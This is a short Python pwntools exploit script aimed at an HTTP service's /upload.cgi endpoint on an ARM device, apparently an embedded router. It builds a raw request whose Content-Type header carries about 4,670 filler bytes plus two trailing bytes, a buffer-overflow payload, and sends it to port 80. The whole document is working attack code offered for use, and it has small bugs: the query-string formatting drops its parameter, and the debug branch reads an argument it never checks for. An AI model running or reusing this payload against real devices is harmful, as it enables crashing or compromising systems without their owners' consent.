#!/usr/bin/python3

from pwn import *

def purl32(value):

    a = (value & 0x000000ff) >> 0
    b = (value & 0x0000ff00) >> 8
    c = (value & 0x00ff0000) >> 16
    d = (value & 0xff000000) >> 24

    return "%{:02x}%{:02x}%{:02x}%{:02x}".format(a,b,c,d)

def form_packet(ip, param='', content='', content_type=''):
    
    packet  = ""

    packet += "GET http://{}/upload.cgi".format(ip)
    if param:
        packet += "?{} HTTP/1.1\r\n".format(ip, param)
    else:
        packet += " HTTP/1.1\r\n"

    packet += "Host: {}\r\n".format(ip)
    packet += "Connection: keep-alive\r\n"
    packet += "Content-Length: {}\r\n".format(len(content))
    packet += "Content-Type: {}\r\n".format(content_type)
    packet += "User-Agent: {}\r\n".format('Mozilla/5.0')
    packet += "Accept: */*\r\n"
    packet += "Origin: http://{}\r\n".format(ip)
    packet += "Referer: http://{}/home.cgi\r\n".format(ip)
    packet += "Accept-Encoding: gzip, deflate\r\n"
    packet += "Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\n"
    packet += "\r\n"

    return packet.encode()

def exploit(ip):

    payload  = "A"*0x123c
    payload += "\x01\x01"

    packet = form_packet(ip, content='', content_type=payload)

    p = remote(ip, 80)
    p.send(packet)
    r = p.recv().decode()
    log.info(r)

def debug(session_id):

    log.info("Done.")

if __name__ == "__main__":
    
    context.clear(arch='arm')

    if (len(sys.argv) != 2):
        print("{} [ip]".format(sys.argv[0]))
    elif (sys.argv[1] == "debug"):
        debug(sys.argv[2])
    else:
        exploit(sys.argv[1])
